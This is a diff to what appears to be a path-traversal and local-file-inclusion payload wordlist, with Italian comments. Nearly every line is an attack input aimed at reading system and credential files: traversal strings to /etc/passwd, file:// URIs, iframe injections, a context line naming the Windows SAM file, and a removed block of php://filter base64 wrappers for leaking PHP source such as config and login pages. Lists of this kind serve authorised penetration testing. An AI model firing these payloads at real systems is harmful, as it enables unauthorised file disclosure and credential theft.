@@ -32,25 +32,11 @@ C:\Windows\System32\config\SAM
 == Check Linux
 /etc/passwd
 ../../../../../../../../etc/passwd
+file../../../../../../../../etc/passwd
 file:///etc/passwd
 file://etc/passwd
 <iframe src=/etc/passwd height=500 width=500></iframe>
 <iframe src=/etc/passwd+height=500+width=500></iframe>
-
-== Tipici file php da intercettare nella home page
-php://filter/convert.base64-encode/resource=index
-php://filter/convert.base64-encode/resource=login
-php://filter/convert.base64-encode/resource=home
-php://filter/convert.base64-encode/resource=main
-php://filter/convert.base64-encode/resource=default
-php://filter/convert.base64-encode/resource=welcome
-php://filter/convert.base64-encode/resource=frontpage
-php://filter/convert.base64-encode/resource=landing
-php://filter/convert.base64-encode/resource=start
-php://filter/convert.base64-encode/resource=root
-php://filter/convert.base64-encode/resource=entrance
-php://filter/convert.base64-encode/resource=config
-php://filter/convert.base64-encode/resource=upload
 
 == Null byte (../../../../etc/passwd%00 viene realizzato con lo script python quindi non lo aggiungo alla lista)
 
